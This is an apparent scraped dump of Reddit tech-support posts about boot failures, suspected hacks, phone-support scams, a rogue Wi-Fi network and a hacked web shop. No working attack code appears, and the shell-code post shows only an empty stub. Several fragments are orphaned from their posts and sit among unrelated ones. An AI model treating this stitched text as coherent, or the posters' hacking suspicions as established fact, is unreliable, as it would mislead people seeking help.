Against my better judgement, I attempted to sign into one of the networks and was greeted with a Facebook login I needed to do before getting access to the network.  I don't have Facebook and even if I did, I wouldn't put my actual credentials in, so I just put in some random bullshit and surprise surprise, it gave me access to the network.  I then went to google to check my public facing IP and it was different than the IP I recorded when I was my work WiFi.  I should note that I shut off mobile data for this to make sure it wasn't just pulling my mobile IP but for the sake of transparency, I checked my mobile IP several different times and it always had the same network part, different than the IP I pulled from the rogue network.  Upon looking up the IP address, I find out the provider is AT&amp;T (SBC) which is not the provider my work has (we have Comcast Business).  Tonight, I had time to get a good look around to see if there were any devices I could spot that might be the source, even took a good look up in the ceiling panels to make sure there were no devices up there, but I couldn't find anything.  I'm of course assuming this thing is plugged in for how long it's been operating.

I obviously can't confirm this is a honeypot, but I feel all the indicators are there.  I did some signal strength testing and it gets stronger the closer I get to the wall of the adjacent business.  One final thought; there was a network that showed up and continues to show up called ""kali"" and upon looking that up, it turns out it's a Linux distro specifically designed for pentesting.  This can't all just be some big coincidence, can it?

Edit: Thanks everyone.  It seems the most common advice is to contact the building owner/managment along with different law enforcement agencies.  I'll see where that takes this.

d1kylu,PC won't power on (usually). Long post,"Hello all,

First time posting here. I'll preface by saying I'm no computer or tech expert by any means, so hang with me and I apologize for any ignorance.

PC info:
* ASUS|H81I-PLUS LGA 1150 R
* i5 4570
* NVIDIA GTX 980
* Corsair CX500M
* 1TB HDD

My issue in a nutshell is that the pc will not power on except for seemingly randomly after endless fiddling. When it does power on, it runs absolutely fine with no hiccups. I ran it for nearly 2 weeks (putting it to sleep frequently) before the power went out due to a storm, which is where I'm at now, unable to power it back on. I'll give a recap of what has happened to date to provide as much info as possible.


My issue arose when i tried to power on my PC after a moderate hiatus. Pressing the power button on the case yielded no response. I tried circumventing the switch by shorting the appropriate pins and got nothing once again. A couple times I pressed the power switch and got some momentary start up with fans spinning, just for it to die before reaching more than half a second of on-time. Cue me unplugging everything, making sure things are seated, etc. 

Nothing.

During my fiddling I accidentally disconnected the power switch wires off the back of the power switch module, and wasn't able to get them back in place. After trying to short the pins with no success I reconnected the power switch cable to the mobo pins.  All this to say, at one point I touched the wires together at the back of the power switch module, and voila- power. No idea why, because I had tried this before. 

Things seemed to be going fine, I was utilizing the pc daily with no problems whatsoever, but I was hesitant to power down and move it back from where I was using it temporarily to its original desk space. So I reluctantly powered it down and attempted the ""wire-touch"" again and BAM, it booted right back on. Success! I thought....I moved it across the house and once again it would not power up. I fiddled and fiddled, reseating and checking connections and I eventually got it to power on and I'm not sure how to be honest.

Last night the power went out at my house and here I am again unable to power it on. I have used a multimeter to check all the pins in the 24pin connection of the PSU and they are all within acceptable ranges. I checked the CMOS battery and found that it was ~2.7 VDC (I couldn't find conclusively if this was to low, or if in fact it would affect anything beyond timers anyway). I actually bought a new PSU originally believing mine was bad and that didn't change anything. The little green light on the mobo is illuminated so I know it's getting *some* power. I haven't found any shorts that I can see. 

Most recently I let it sit for an hour or so and came back and tried shorting the power switch pins with a screwdriver and the fans spun up each time I touched it for a second or two. During this instance I had only my CPU, RAM and PSU hooked up. That was as far as it ever got. I'm a bit lost here, everybody.

Now, he already has an HDD and he wants to keep that for storage and what not. He wants to run windows off the SSD.

d00njo,Very strange incident with my PC typing sentences to me - need help,"Hear me out this sounds very crazy. 

Was playing  battlefield 4 when I wanted to record something with nvidia. I hit a few different key combinations on my keyboard and found the one that saves my games footage. A few seconds  after that it started clicking random keys/bugging out. The game then opened the chat and wrote “amr admin” then out of panic I left the game. I can’t recall if I opened chrome, but as I opened it it started typing actual sentences into the search bar. I was trying to figure out what was typing so I clicked keys at the same time yet you can clearly see its sentences being written... it wrote “use thea hze li again?” And “deah but now i might not be able ti do much :^_”. I immediately ran a anti malware software (malwarebytes) and it came up with nothing. When trying to leave battlefield it reconnected me to the server and it would keep tabbing back into the game. My mouse then continually flickered until i rebooted my pc. 

I checked my keyboards macro ect and didn’t find anything. Looked online and cant find any threads/help related to this. This feels absurd and scared the hell out of me. I dont know if its malware or some sort of strange hardware error.  I haven’t recently downloaded anything in the past 2 weeks. 

What steps should I take? I am considering hard wiping my Pc but I have a bunch of important files. Has this ever happened to anyone? Is my PC compromised? What do I do? 

Sorry for the bad format, I’m panic typing from my phone.

Edit: I’m not able to reproduce typing at all, even when re-doing the keystrokes I did earlier

Edit 2: thank you all for your kind help. I checked all macros and followed instructions to see if anyone was connected and nothing came up. Rather be safe than sorry so I nuked the PC. Ill check back and re do the tests to see if anything comes up again

Edit 3: thank you all again for your input and help. So as mentioned earlier many people seem to have concluded to this being a macro, however I didn’t recognize any of the writing. Despite this it might have possibly been something I wrote a long time ago. My macros came up blank and nothing is binded to my keyboard or mouse. Even if chances are it being a macro is high, I preferred wiping my PC as I was never able to pinpoint where it came from or what caused it. Even if i ultimately think its most likely a keyboard/macro issue). 
Some people also mentioned it maybe being a BF4 server issue. I will still follow all the steps you all provided me and double check with my clean PC. If I find anything Ill check back here.

I've recently started working for a small business (8-10 people) and there file management is absolutely awful. There are a large amount of out of date documents, duplicate files spread throughout different folders and sub-folders and their overall system of organizing files makes little to no sense. It is very hard for new staff members to find anything the way it is at the moment. I have been tasked with cleaning this up and trying to implement a system (whether that be a program or just some structure the staff can follow) to fix this big mess. I've looked at a few different pieces of software but most of which are expensive and do much more than we currently need. I think all I need is a way to archive the junk, remove the duplicates and make searching for things easier. Anyone got any suggestions on where I can start?

I built this PC at the start of this year. When I first turned it on it was extremely fast, ran games and programs amazingly and I had no problems with it.

However, roughly 8 months down the line, it's become extremely slow. It takes forever to turn on, programs crash constantly and games don't run as well. I haven't installed anything fishy and virus scans don't turn anything up.

There's about 200gb still left on the HDD and I have no idea what could be slowing it down so much.

What can I do to clear/clean this PC without factory resetting? I'd rather not have to lose all my game files and other stuff if possible as I have no way to back them up.

cw8l5t,"Been in IT for 10 years, have never seen this before - could use a hand - Internet Connectivity","Little back story: This is a long standing client of mine who I fix their issues whenever they call me. I have been their IT partner for a number of years now but also work in the IT industry.

This client calls me up saying that they are having issues with internet connectivity, no biggie right? -  reset a modem, redo a driver or two, 25 minutes tops - Oh how wrong I was, we are on day 2.  I am now here asking the experts as even the ISP has been no help.

\---

The issue begins with the computers redirecting all internet traffic to [http://msftconnecttest.com](http://msftconnecttest.com) , and windows saying no internet access.  This is normally indicative of no connection and windows redirecting you to this page to connect to a website. First thing I did was reset the modem (Frontier/Verizon) this did not resolve anything. This did not resolve the problem. Next was to use windows to reset the network settings and drivers on the computers - special note both mac and PC are unable to access the network, but only PC is being redirected here - same thing, nothing working. During this I also disabled msftconnecttest coming up in the registry, yet when attempting to visit any website, the website will ""load"" and the msftconnecttest page will load instead yet the website will look like it will load.

Ping test to google resolves to an IP of [172.19.1.254](https://172.19.1.254) which is NOT google's, with a time of less than 1ms, in fact a ping test to ANY website resolves to that IP with a time of less than 1ms. Computers on the network are both wired and wireless and cannot even ping the modem at this point. I call up Frontier and the tech literally says to me that ""The modem has been hacked by Russia"" (I am not kidding, I wish I had the call recorded) and that it would need to be replaced. I got the modem replaced at the local Frontier store and the exact same thing is happening... but here is the kicker - if you turn on a mobile hot spot, the computers work just fine, so this is obviously an ISP issue right?

So I call up Frontier AGAIN, and get someone else on the line who tells me that they are able to ping the modem and they see internet connectivity and if I want any other service I need to get in touch with Premium IT Support (a paid service... no surprise here).

I am at a loss. Internet works fine off of Frontier and yet Frontier claims there service is working? yeah\_ok.gif

cv5azu,Need advice on how to deal with my grandmothers friend says she needs to use my computer to reset hers after being hacked.,"I am 18 years old and have just started going to college, I live with my grandmother and have a Mac that I use to do homework, and take a coding class, Anyhow my grandmother told me to bring the computer downstairs because her friend needs to use it. From what I could gather her friend says that she has been hacked and that her and her son will be coming over to my grandmothers house to use my computer to ""reset"" theirs. They said that they couldn't give her anymore details over the phone because ""the hackers were monitoring their calls"".

When I told my grandmother that it sounded fishy and asked her for more details, she reminded me that she was allowing me to live there, so I have no choice but to let them use my computer. I normally am out at the time of day that they are coming and do not want them going through my computer and potentially either downloading some more malware or trying to get into my accounts since I do not know them. 

&amp;#x200B;

This whole thing sounds incredibly fishy, so I need to know is there any possibility that this is legitimate and that by using my computer they can somehow reset theirs and leave virus free, or is it more likely that they will (perhaps unknowingly) install malware on my computer as well. I am skeptical since I recently downloaded a virus myself and got rid of it with a factory reset without the use of another computer. 

Its also possible that they will be bringing physical hardware that they can connect directly into my computer.

What can I do to protect my computer while they are here? I am thinking of maybe creating a guest user so that they can use the computer without administrative privileges, or having access to my files. will this be sufficient to protect my computer?

cuzcnh,New build freezes on motherboard logo screen overlay on Windows load even after replacing / testing every single component.,"I consider myself fairly competent with computer parts and computer stuff in general and have built 7 computers prior to this one but the issue I'm having now is completely beyond my comprehension &amp; I'm certainly not a computer hardware expert by any means.

Some backstory -- On Monday I moved cubicles &amp; whoever built the cubicles out in our office did not properly ground the one I moved to. When I plugged my 7 month old PC into the powerbar connected to the cubicle power outlet, it shorted and fried virtually everything.

We did not have any other PC parts compatible with my build to test to see what was and wasn't fried from my PC so I ordered essentially an entire new computer with the plan on returning what still worked from my original PC.

Since then I have had this issue where on boot, the system freezes on the motherboard's logo, and the wheel thing just stops spinning (sometimes with it saying ""preparing windows repair"", sometimes with it just being the spinning circle, sometimes ""preparing disk check"" etc.).

I have had this same issue with two motherboards now, two CPUs &amp; two PCUs. I have ran memcheck on the new RAM I bought and after four passes it gives no errors, both with each individually and them together (interestingly, memtest86 boots without issue, as does BIOS). I have tried different monitors &amp; different wall outlets as well. I have tried to boot windows from two different drives, one was the SSD from my dead computer (which boots windows on my laptop without issue) and one was an empty disk drive where I installed the windows UEFI repair software from [here](https://www.microsoft.com/en-ca/software-download/windows10). I have tried both of these drives via SATA and via USB.

The only thing I can even remotely think of it being now (I'm really out of ideas for what to continue troubleshooting at this point), is that I did test my old RAM on both of the new motherboards I have tried (when i got the second new mobo I wasn't sure if it was the old mobo that was DOA) but it still seems unlikely that damaged RAM would permanently damage the motherboard into the issue I'm having (just an assumption however). My old RAM is definitely fucked though as the motherboard just turns on and then off quickly after a few seconds when I try to use it.

The parts I have tried so far:

- Two Intel I9 9900ks

- [Asus ROG Strix Z390-E Gaming](https://www.amazon.ca/gp/product/B07HCPLQ2H/ref=ppx_yo_dt_b_asin_title_o03_s00?ie=UTF8&amp;psc=1)

I am using a new Coolmaster 212, arctic fox thermal paste, I seated it by screwing three times in a clockwise fashion for even CPU pressure distribution etc.

I have tried plugging the display into my 1070, 2080ti &amp; my motherboards display port and it's still the same issue.

One more thing I've never seen before that happens between both motherboards (this might be normal though) is when I flip the switch on the PSU to turn it off, the next time I try to boot it, the motherboard will run for ~20 seconds with a red light  next to CPU warning, shut off and then will boot normally until it freezes at the motherboard logo overlay screen.

Any help is greatly appreciated, this has been the most frustrating week I can remember in quite some time...

All I want to do is to get back to making machine learning models for work :(

Quick and silly post here. 

I recently built a new computer which I am really proud of. Unfortunately, after getting everything together I had a problem that made my windows have some difficulties with booting up (It froze at the login screen) and I had to restart ""by a button"" to make my system work properly.

Fortunately, after digging in bios, updating it and other drivers I managed to fix the problem, although now I have this strange, paranoic feeling that by resetting my pc I could break some hardware.

crebj8,Hearing voice chat-like sounds through computer,"Hello dear Redditors,

&amp;#x200B;

i have been having problems with my computer for past year, but i never really payed any attention to them, until now.

I had issues where mouse would randomly jump during usage, attributing this only to generic mouse jumpiness, more often, computer acting as if CTR or ALT or windows key was being pressed, this appearing completely randomly and apparently unrelated to any running software - i have read somewhere that windows 10 had some kind of this issue, and i could easily fix it with pressing both ctrl/alt/windows keys at the same time few times to relieve this, so i wasnt particularly concerned, even though i did a repair of windows once, which didnt help for long.

However, what happend today, scared me somewhat, as i have never ever crossed path with anything similar.

I have been watching youtube and chatting with a friend over steam, when i put my headphones on instead of speakers after months, and noticed strange sounds. I could clearly hear someone, as if over voice chat, not talking, just sitting at computer. I could hear keypresses, clicks and what sounded like someone drinking water and putting down the glass on wooden table.

I first checked if my mic was disabled, then looked through playback devices, nothing looking like producing sound.

At first i have writtent to friend over steam, to say something, thinking its some new steam chat feature or something, but i couldnt hear him say anything when he tried.

Then i clearly heard someone receive a message on phone - three beeps of some kind, a pause, then a crackling click, like when you pull the speakers out of jack connector, and since then nothing.

I have no other voice chat apps installed, like skype/discord/etc. I have my microphone always disabled unless i want to use it for something, but it was turned off for past few months. I have no other recording devices. The only thing i had turned on during this day was firefox, monster hunter world, and steam, but when the issue occured, only steam and firefox with youtube was running.

&amp;#x200B;

So i panicked, blocked all internet access through firewall, restarted to safe boot, run:

rkill

adwcleaner

hitmanpro

malwarebytes scan

&amp;#x200B;

nothing turned out except two tracking cookies in firefox, which i removed.

Im basically clueless as google searches dont turn out anything useful for this issue.

&amp;#x200B;

Any idea what can this be? Any advice on what i should try?

Im running windows 10

I may provide additional information if neccessary.

&amp;#x200B;

Thank you in advance to anyone who can help.

&amp;#x200B;

EDIT:

Thanks everyone for answering, however, i am 99,9% sure this was not some kind of radio statio. I could literally hear someone sitting at his computer. The three beeps i heard, of message arriving, this wasnt the typical crack of the speaker coil receiving the signal - this was literall beep of message received sound on mobile phone. Unless i can receive someones bluetooth headphone microphone, which im positive i cant, this wasnt just a random transmission.

This would not worry me so much, if there wasnt also issue of the pressed alt/ctr/windows logo keys randomly acting as if pressed. Because combined with this, i feel like someone could have remotely accessed my desktop and now he just randomly forgotten turning his mic off.

&amp;#x200B;

EDIT 2:

Thanks for all the answers and advice. So far i wasnt able to replicate this, and after looking through my network the whole day i havent noticed any strange traffic, or noticed any more strange sounds, but i went ahead with full format and reinstall anyway, just to be sure. 

No antivirus/rootkit scanners turned out anything, so i will be hoping for the most mentioned probable cause - headphones picking up some transmission,  although, considering the clarity of the sound i heard, i still doubt this somewhat. 

As i cant think of anything else to try, and it seems all the good jokes have been said for now, ill be marking this post as solved.

cqxf7a,Neighbors constantly hacking router,"**Edit:** Thanks for the input, folks. I will still accept all other ideas anyone else has on the subject. You have given me some things to think about that may help with the situation. This issue has not been ""solved"" as the core issue is still unknown, however I will mark this issue as solved for the time being since it's unlikely to be resolved without providing more information I'd prefer not to share.

Hello folks.

As the title says, my neighbors are constantly hacking my router to get free wifi and also it appears potentially doing malicious things as well. No matter what I do, they seem to find a way back in. 

I came back from a trip to find that for the past few weeks they had been going hog wild on my internet. Dos attacks against my router, and constantly connecting from a strange internet IP that did not match my DHCP settings. They also had numerous devices approved in my Mac filtering list. I have also noticed my computer acting strangely on occasion, which often begins after I change passwords. The anti-malware procedures in the stickied thread on this subreddit did not find anything on the numerous times I've done it. 

What I have tried:  
- Mac filtering  
- [VERY] strong and random passwords for wifi and to get into router that I change regularly  
- Changed router to a nonstandard IP  
- Turned off WPS  
- Maybe a thing or two I am forgetting

It's extremely obvious they are very tech savvy, and have access to sophisticated hacking programs. After I change passwords and whatnot, there is typically a period of time where they don't get in. This has been going on for about a year. It's a constant battle between them and myself. 

What can I do to keep them out for good? Should I get the police involved? What could they even do if I did?",https://www.reddit.com/r/techsupport/comments/cqxf7a/neighbors_constantly_hacking_router/,1565909481.0,100,0.89,139,techsupport,Kingnahum17

cnxtdp,"Professor of my online course accused me of plagiarism, then immediately deleted an important sentence from that assignment's submission page on the website when I called her out. Is there a way to roll the site back to a few hours ago to find it? (more context in post)","So I'm in an online college course and I got a weird, vague email from the professor a few days ago claiming that I plagiarized. She threatened to report me to the dean of academics at my university (I'm taking the online class through the school I attend full-time). When I asked her what she was talking about she told me that I had uploaded another student's assignment with her name on it.

That was true, but it was an honest mistake on my part. The reason I even had another student's assignment on my hard drive was because we were supposed to upload our assignments to a forum, and the submission instructions included the sentence ""Post your assignment here so everyone can view your ideas"". The assignment was confusing, so I downloaded a PDF another girl in my class had already posted. Looking at her assignment helped me get started, and after I finished my assignment and exported it as a PDF I went to upload it to the forum. The girl's PDF had a similar name to mine so I accidentally uploaded hers instead of mine and here's where the shit show begins.

I sent an email to the professor apologizing and explaining that it was an honest mistake. I sent her my PDF that I had intended to turn in, provided a screenshot of the file's metadata showing that it had last been modified before the assignment's deadline, and even told her how to view the metadata for herself if she didn't believe me. Then she sent me another email telling me I'd still receive a zero on the assignment because I ""crossed a line"" by downloading another student's assignment and ""using it as a model"" for my own. Pissed, I emailed her back telling her (politely) that the submission directions literally told us to do exactly what she just described, and I quoted the exact sentence that encouraged us to do that verbatim. I sent the email and began texting a friend to tell them what happened, but when I looked back at the submission page for that specific assignment, the sentence I'd quoted was removed from the page completely. This was not even 10 minutes after I sent the email.

Anyway, I'm guessing she deleted the sentence so that she could deny the fact that it was ever included in the directions. I'm hoping I can somehow roll the site back at least a few hours so I can prove that she deleted it (rolling it back to yesterday or something would work too). I already checked, and the site was never archived on Wayback Machine. The forum in question is on my school's Moodle page, if that helps

&amp;#x200B;

**TL;DR** professor accused me of plagiarism, I called bullshit, emailed her and quoted a sentence that was very important to my case from the course's website, she deleted it within a few minutes after I sent the email. Need to know if there's a way to look at previous versions of the site (other than Wayback Machine) or a recent archive of some sort

UPDATE: Thankfully the professor told me that she deleted the sentence to prevent further confusion and assured me that she wasn’t trying to hide something. Thanks for the help yall.

I had a problem with the last Microsoft update and had to reinstall my Microsoft programs (including Word, which was very annoying).

4uowv4,Time Warner is recording my router settings. Is that normal?,"I have been a Time Warner Cable customer for 16 years. Over this period of time I have configured many of their routers because they crap out or get ""upgraded"" all the time, but I've never seen this happen. 

I had been exclusively using one of their all-in-one modem/router/WLAN units recently, but it started acting up. Unannounced, I exchanged it in person for a ""new"" unit that was in shrink-wrap packaging. The whole transaction took about 5 minutes. Different brand, same basic functionality. 

When I got the new unit connected I called and activated it. When I logged into the GUI with default credentials, I was expecting to have to completely reconfigure DHCP scope, WLAN, and admin creds. To my surprise the custom SSID and password that I had configured in my old router had been pushed to the new router, but none of the other settings came over. I was very surprised to see WIFI was automatically configured to match the old router.

The only conclusion I can draw is that TWC has my SSID and key stored in a database somewhere. I called tech support but they had no answers and claimed it was sheer coincidence that both routers happened to have matching SSID and password (which is 100% implausible).

Should I be concerned by this? Is it standard practice now? It kind of gives me the heebie jeebies.

4sb8xi,"Friend got hit by ""Microsoft Support"" phone scam, what am I in for when I go clean it up?","An elderly friend of mine got hit by one of the ""Microsoft Support"" phone call scams today.  He got nervous partway through their phone call and called me on another line; I had him hard shutdown the computer and hang up on the scammer.  I know he had provided remote access and the caller was connected to his computer, but I don't know anything beyond that.  I'm at work and didn't have time to go into any detail.

What am I in for when I go to clean this up?  Does anyone have experience repairing a computer after one of these calls?  I suppose they're probably not the same every time, and it could depend on whether or not anything got installed.

If it were my computer, I'd just reformat and call it good.  In this case, I *really* don't want to deal with that - he's one of those users who panics when his icons get moved around, so trying to get everything set back up after a wipe will be miserable.

Edit: The scammer was on the computer for less than 5 minutes, and as far as I can tell they only installed LogMeIn Rescue and started circling ""viruses and errors"" on the machine (presumably Event Viewer, although he doesn't remember what the screen looked like for sure).  No credit card information was provided (and none is stored or used on the PC, either).  The computer is currently sitting on my desk with no networking while I ponder whether to reformat, but it really does look 100% clean.

I tried sending her multiple screenshots of styles/colors of dresses for her to pick out but none of my screenshots went through even though I had full bars..
Suddenly, about 6 minutes later she seemed confused and freaked out, when I asked what was up she asked me why I had I sent her a photo of some random dude. I said I didn't
She screenshotted her side of the convo and there was a photo that she seemed to have received from me less than a minute ago half with the photo of the dress I was asking her about and half of a man I had never seen in my life before..
I called my cell provider and apple, the only thing they could tell me was that the cell tower in my area had pushed a software update around the same time my photo was spliced with somebody else's.
I'd really like to know what happened and who's photo I received, and who received the other half of my photo...

Iphone6s

Here's the real kicker though. I'm troubleshooting on my own, and I'm running CrystalDiskInfo, and it says Caution, 200 reallocated sectors and such...and that the hard drive has over 5,000 hours of power up time.

4qbuah,Boss Fell for Remote Support Scam,"Hello, /r/techsupport. I work in a small mental health clinic. Today, the director ran around to everyone telling them to stop using the computers. I thought it was odd, but didn't think much of it. 

A little backstory... The Director is very ""my way or the highway"" and is extremely intelligent in her field. The HR Manager in this post is my best ally.

After a while, I went to her (Director) and asked what was going on. She said that she received a pop-up from Microsoft saying that they detected a virus ""in the IP address."" The pop-up then said to call one of three companies listed. She called one named ""Cyber Tech Expert,"" located somewhere in Texas. 

Now, at this point, I know it's a scam. I've been around computers for all my life. My dad is an IT manager, and I worked at my school's Help Desk for a while. The ""technician"" got the Director to give the account and routing number for the corporate checking account as well as download a program that let the ""company"" ""remotely fix"" her computer.

After about an hour, the ""company"" called and said that everything was all set. Then the boss said we could use the computers again. 

I'm annoyed that she didn't follow my advice, but I'm more concerned for her identity and the bank account from which all of our checks are drawn. I convinced the HR manager it was a scam, and she tried to relay that to the director, but the director wouldn't believe it. 

I looked up the company, called ""Cyber Tech Expert,"" and looked at the address online. It's a property that was recently sold, obviously just a fake address. 

I'm wondering what I should do now. The HR director wants me top kind of help with IT (all antivirus out of date, etc). I have no problem doing that. But I'm really concerned because the director as apparently done this scam before and believes that ""Cyber Tech Expert"" is legit. This ""remote support program"" probably now has access to a lot of sensitive information like patient records, logins for payroll, and of course the bank in formation. What should I do?

TL;DR: Boss fell for scam and won't listen to proof that it is a scam. I want to help the company get secure. Boss gave corporate checking info to the scammers, I'm worried about the company's finances and my boss's identity as a result.

4pavrk,Help me catch this bastard,"everyday at work, some bastard coworker remotes in and takes over my mouse when I'm working on something. Like when I haven't saved in jsfiddle my mouse is taken over and the tab is exited out of.  

Update: catch the culprit the old fashion way, seeing who was at their desk, then alt + tabbing through a crazy environment I had set up on my desktop. Found the smirk. Had a conversation, it's dealt with!

Edit: someone asked for the full story so here it is.   
Full Story: I didn't have a lot to do today so I come in excited to run the clock on the things I do have to do. I'm mostly a backend developer so when I get to do front end work I feel like I'm an artist and just try shit out.   
I wanted to see how things were animating, and in the local environment I set up I just didn't pull down the clients media. I was too lazy to go back and do that(didn't wanna wait on it basically). So, every time I tested something on my local config it took forever to load because it was searching for those media files. Anyway, I just decided fuck my local environment took the pieces I was working on and put them in jsfiddle because that site is fucking awesome.   
So, I'm making silly animations and showing them off to people, then I go get some coffee where I was infiltrated and team viewer was logged in on. As I return, it felt like I had a selected a really shitty grocery cart where it just goes the wrong fucking way when you push it forward. I unplug my mouse, plug it back in, back at it. I go back to trying to work. Getting progressively more frustrated, I believe I was working on a toggle class animation where it was straight up closed(to my cohorts displeasure come to find out because that's what lit the fire below my asshole) apparently I was 'fighting back' with my mouse and thats how it got closed. Who knows anyway then I posted here, came back early from lunch where a few people were here and made a decoy environment with as much weird shit as I could open in different tabs. Then I got to a good vantage point waited for the expression of the face of someone who had really seen the light, then confrontation.

4l9ymr,My minifridge turning off on the other side of my room disables the internet for 2-3 seconds on my wired PC. How?,"(tl;dr at bottom.)

I have absolutely no idea how this is happening. This isn't a *support* request, as I've obviously identified the problem, but more a question of how this is actually possible.

About seven years ago I met with a friend of mine who partook in dumpster diving as a hobby. He'd find all sorts of cool shit, and one time he happened to pick up a working minifridge. It was old as hell, a GE model. Probably 80s, judging by the fact it has that ugly faux wood paneling along the front. He said he was going to just toss it back in the dumpster because he had no use for it, so I should take it, and I did! Never touched it, just threw it in my closet.

About three years ago, I moved, and decided I had some drinks I wanted to keep separate from the main fridge so other people wouldn't drink them. Luckily, I'd been dragging this ancient minifridge around with me for half a decade, and so plugged it in and was happy as hell. It actually ran! Not only did it run, it ran *great*. Ice cold. It was perfect. I loaded it up with drinks and was pleased.

A day later, I was playing a game online on my desktop. I play with headphones, usually listening to music. Suddenly, I was disconnected. Didn't think anything of it, it happens sometimes.

An hour later, I was disconnected.

An hour later, I was disconnected.

I started noticing that it was at the *exact same minute* that I was disconnected every time. I called my ISP to ask what was up. Nope, no outage, and they don't see any disconnects on their side. I told him to wait a bit. 15 minutes later, at the exact same minute, my internet cut out for 2-3 seconds, then immediately popped back online. Again, the tech on the other end said there was no disconnection. I asked to speak to a supervisor, and the same thing. They didn't see any disconnects, and refused to believe that I was having the problem I was claiming.

Figuring my ISP was simply useless, I ignored it. It was extremely frustrating that I now had this issue, but I could live with it. I just had to start planning better. I live somewhere that has an ISP monopoly, so I had no other option but either deal with disconnects every hour, or have no internet at all.

The issue persisted for quite a while. Finally, about eight months ago, I moved again. Same town, just about a mile down the road. I was excited, because I thought for sure whatever issue was going on would be fixed.

And then it wasn't. I couldn't believe it. In a new home, in a new neighborhood, with a new router, and a new modem, I had the exact same issue. Every hour, at the same minute every time, my internet would cut out. I thought for sure that it had to be my computer. So I cracked into my savings, and built a new gaming PC.

And had the *same problem.* Every hour. At the same minute. The Network on my PC would change to ""No Connection"" for 2-3 seconds, then would find the network and pop back online like nothing happened. Every single hour. I had replaced literally everything in my home, *including the house itself*, and had the same issue. I absolutely could not believe what I was seeing.

For some reason, four days ago, I was on my PC, playing around online and wasn't wearing headphones. I *always* do, but for whatever reason, I just wasn't feeling like listening to music, or playing a game, so I kept my headphones off. Sure as shit, I heard my minifridge rattle as it powered off, and noticed that my internet had disconnected. Two seconds later, it came back up.

*Holy shit.*

So I left it plugged in. Sometime during that hour, it had powered itself back on to cycle, and there it went again; exactly one hour later, I heard the rattle of it turning off, and my internet disconnected. The next hour, same thing. I was astonished. It was my fridge this whole time.

Since then, I've unplugged it, and I haven't had an internet drop ever since.

But I still have no idea *how* this is possible. I realize how absolutely outlandish this sounds, but by some miracle I actually found [someone else who had the exact same problem](https://hardforum.com/threads/internet-connection-disconnecting-every-time-refrigerator-starts-stops-strange.1754254/) who was never able to find a solution. Only difference in his case is it happened when it turned ON and off. Mine was only when turning off.

Their suggestion was brownout, but that isn't it. My fridge is on a different outlet than my PC. Additionally, the router and modem are in an entirely different room. Plus, this only happens when my fridge turns *off*.

It isn't a hardware issue on my PC, because two completely different computers, one being absolutely brand new, had the exact same problem. It isn't software because it is obviously the fridge turning off that causes it, and it isn't networked to my PC, clearly.

I doubt it's something like static discharge, because the fridge is on the opposite end of my room, and the ethernet cable never touches it or gets anywhere near it. Same with the router, which is in an entirely different room.

So I have absolutely no idea, and I'm wicked curious to see if anyone can diagnose this. I have literally NO idea how this is physically possible.

**tl;dr**: An ancient minifridge from the 80s or 90s turning *off* on the other end of my bedroom causes my wired desktop PC connection to disable itself for 2-3 seconds. This happens on two PCs, one being brand new, on a new modem/router, and even in a new *house*.

We'd like to get your input on having an /r/techsupport F@H team.

[Folding@Home](https://folding.stanford.edu/) is a distributed system for calculating the folding of proteins. It holds the key to every single cancer cure as well as hundreds of other diseases, and is a worthy thing to donate your unused processing power towards. It's nothing new, and we wouldn't be the first community to do it, but that doesn't make it any less world-changing. 

Due to the nature of the subreddit, we have a lot of awesome people with access to significant amounts of computing power.

A series of special icons as ""awards"" to those passing milestones as well as their point score could be displayed on each contributing user's flair, as bragging rights. We could possibly compete with other subreddits as well.


What do you think about this? 


Seems the consensus is ""fuck yes"" so we've created a team - 230852.

4hx61g,"Blackhat shell code hackers destroying my company website, Explain to me how this works please","My company was just hacked by a Blackhat shell code. I am interested how the code works. As far as I can tell, its an encrypted code that gets decrypted when my php.init file is executed? But I'm totally guessing. I need someone to explain this to me like I'm five so I can better understand how someone managed to do this.

I'm not looking for advice on how to fix this. I'm more interested in how it happened so I can prevent it from happening again.I don't expect anyone to solve all my problems. I'm just a very knowledge thirsty individual on the subject.

Here is the code on a .php file I found in the root folder:

    &lt;?php 
    
    
    
    
    
    # LOL

Ironically, this occurred right during our IT ""revamp"" We were resetting passwords, requiring SSL encryption, SSH hardening, etc. I'm not exactly a tech wizard. I just hear bits and pieces... anyways, we got hit by a checkout error. Our checkout page was looping back to our Magento shopping cart. Then, today, the website crashed and we discovered the .php code in the root folder.

How can we prevent this? Is this a common issue among small businesses? How does the code work? Are we screwed? Is anyone going to have their CC info stolen? Will we ever know?

4gbrw8,Someone's getting past my two-step authentication,"I'm not sure if this is the correct subreddit to post in, so I would also appreciate being redirected to a more appropriate one if that is the case.

For the past few months, someone has been logging into my gmail account and using it to attempt to (and sometimes successfully) reset my passwords for Facebook and other accounts. I have two-step authentication enabled on Gmail (meaning you need to log in with the correct password and then additionally provide a code texted to my phone). Nevertheless, this person has still been able to access my account or otherwise reset my passwords. 

This has happened a couple times now, and what I notice each time is: I receive multiple emails of password reset requests for Facebook done all in a row (like as many as seven or eight password resets all requested within a minute or so), then an email saying the password has successfully been reset. (Sometimes I just get the reset requests, but the reset does not end up going through.) I will also get a text on my phone with the code, suggesting the person was able to log in with my correct password. The fact that they are able to confirm the password reset makes it seem like they were somehow able to access the code on my phone to complete the log-in. However, what's weird is that if I check my account activity log, there is no record of a log-in that isn't mine.

I'm honestly just really confused. This person seems to be logging in, since they are sometimes able to reset my password to Facebook, and they must have at least input the correct password for me to be getting a verification code. However, no unusual log-in appears in my activity log, and I also don't understand how they could possibly be logging in at all. This continues to happen even after I change my password (and yes, it is very long with many special characters, numbers, etc.) 

I also considered the possibility of a keylogger on my phone, computer, or both. I did a hard wipe on my computer, re-installed the OS (it was time for me to upgrade to the latest version of Fedora anyway), and still this problem persisted. This also happened to coincide with me needing a new phone, but even with the new phone, same problem. 

Is there anything else I missed that I can check to see if that's the issue? I really just want this to stop. I hope my explanation of the problem is clear -- I'd be happy to clarify anything.

4dtsbg,"Built a PC, it works great! Except I get an error/error message or some kind every single day.","Hi there!
So about half a year ago, my dad decided to give me the money to build my own PC. So I bought all the parts and my dad and his friend put it together for me (I'm terrible with handling hardware).

It works great! It runs games really well, is really fast, and all that nonsense. (at least compared to the old laptops I used to use)

[Here are the parts I used for this.](http://pcpartpicker.com/p/fszWMp)

